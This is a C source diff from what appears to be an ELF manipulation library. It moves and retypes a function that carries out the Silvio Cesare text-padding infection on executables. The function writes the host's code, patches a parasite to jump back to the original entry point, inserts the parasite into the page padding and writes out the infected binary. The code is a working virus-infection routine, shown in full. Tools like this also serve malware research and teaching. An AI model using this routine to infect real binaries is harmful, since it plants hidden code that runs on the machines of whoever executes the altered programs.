@@ -46,11 +46,79 @@
 
 #define PAGE_SIZE 4096
 
+static _u8 _malelf_infect_silvio_padding(MalelfBinary* input,
+                                  MalelfBinary* output,
+                                  unsigned int end_of_text,
+                                  MalelfBinary* parasite,
+                                  _u32 offset_entry_point,
+                                  unsigned old_e_entry,
+                                  _u32 magic_bytes) {
+        _u8 error;
+        unsigned int c;
+        char *parasite_data = (char*) parasite->mem;
+
+        MALELF_DEBUG_INFO("Inserting parasite\n");
+
+        if ((error = malelf_binary_openw(output, output->fname))
+            != MALELF_SUCCESS) {
+                MALELF_DEBUG_ERROR("Failed to open file '%s' for write.",
+                                   output->fname);
+                return error;
+        }
+
+        if ((c = write(output->fd,
+                       input->mem,
+                       end_of_text)) != end_of_text) {
+                return errno;
+        }
+
+        if (offset_entry_point == 0) {
+                if ((error = malelf_patch_binary_at_magic_byte(parasite,
+                                                              magic_bytes,
+                                                              old_e_entry))
+                    != MALELF_SUCCESS) {
+                        return error;
+                }
+        } else {
+                if ((error = malelf_patch_binary_at(parasite,
+                                                   offset_entry_point,
+                                                   old_e_entry)) != MALELF_SUCCESS) {
+                        return error;
+                }
+        }
+
+        if ((c = write(output->fd,
+                       parasite_data,
+                       parasite->size))
+            != (unsigned)parasite->size) {
+                return errno;
+        }
+
+        if((c = lseek(output->fd,
+                      PAGE_SIZE - parasite->size,
+                      SEEK_CUR)) != end_of_text + PAGE_SIZE) {
+                return errno;
+        }
+
+        input->mem += end_of_text;
+
+        /* unsigned int sum = end_of_text + PAGE_SIZE; */
+        unsigned int last_chunk = input->size - end_of_text;
+
+        if ((c = write(output->fd, input->mem, last_chunk)) != last_chunk) {
+                return errno;
+        }
+
+        MALELF_DEBUG_INFO("Successfully infected: %s\n", output->fname);
+        return MALELF_SUCCESS;
+}
+
+
 _u8 malelf_infect_silvio_padding32(MalelfBinary *input,
                                    MalelfBinary *output,
                                    MalelfBinary *parasite,
                                    _u32 offset_entry_point,
-                                   unsigned long int magic_bytes)
+                                   _u32 magic_bytes)
 {
         int i;
         _i32 error = MALELF_SUCCESS;
@@ -148,7 +216,7 @@ _u8 malelf_infect_silvio_padding(MalelfBinary* input,
                                  MalelfBinary* output,
                                  MalelfBinary* parasite,
                                  _u32 offset_entry_point,
-                                 unsigned long int magic_bytes)
+                                 _u32 magic_bytes)
 {
         switch (input->class) {
         case MALELF_ELF32:
@@ -162,71 +230,4 @@ _u8 malelf_infect_silvio_padding(MalelfBinary* input,
         }
 
         return MALELF_ERROR;
-}
-
-_u8 _malelf_infect_silvio_padding(MalelfBinary* input,
-                                  MalelfBinary* output,
-                                  unsigned int end_of_text,
-                                  MalelfBinary* parasite,
-                                  _u32 offset_entry_point,
-                                  unsigned old_e_entry,
-                                  unsigned long int magic_bytes) {
-        _u8 error;
-        unsigned int c;
-        char *parasite_data = (char*)parasite->mem;
-
-        MALELF_DEBUG_INFO("Inserting parasite\n");
-
-        if ((error = malelf_binary_openw(output, output->fname))
-            != MALELF_SUCCESS) {
-                MALELF_DEBUG_ERROR("Failed to open file '%s' for write.",
-                                   output->fname);
-                return error;
-        }
-
-        if ((c = write(output->fd,
-                       input->mem,
-                       end_of_text)) != end_of_text) {
-                return errno;
-        }
-
-        if (offset_entry_point == 0) {
-                if ((error = malelf_patch_binary_at_magic_byte(parasite,
-                                                              magic_bytes,
-                                                              old_e_entry))
-                    != MALELF_SUCCESS) {
-                        return error;
-                }
-        } else {
-                if ((error = malelf_patch_binary_at(parasite,
-                                                   offset_entry_point,
-                                                   old_e_entry)) != MALELF_SUCCESS) {
-                        return error;
-                }
-        }
-
-        if ((c = write(output->fd,
-                       parasite_data,
-                       parasite->size))
-            != (unsigned)parasite->size) {
-                return errno;
-        }
-
-        if((c = lseek(output->fd,
-                      PAGE_SIZE - parasite->size,
-                      SEEK_CUR)) != end_of_text + PAGE_SIZE) {
-                return errno;
-        }
-
-        input->mem += end_of_text;
-
-        /* unsigned int sum = end_of_text + PAGE_SIZE; */
-        unsigned int last_chunk = input->size - end_of_text;
-
-        if ((c = write(output->fd, input->mem, last_chunk)) != last_chunk) {
-                return errno;
-        }
-
-        MALELF_DEBUG_INFO("Successfully infected: %s\n", output->fname);
-        return MALELF_SUCCESS;
 }
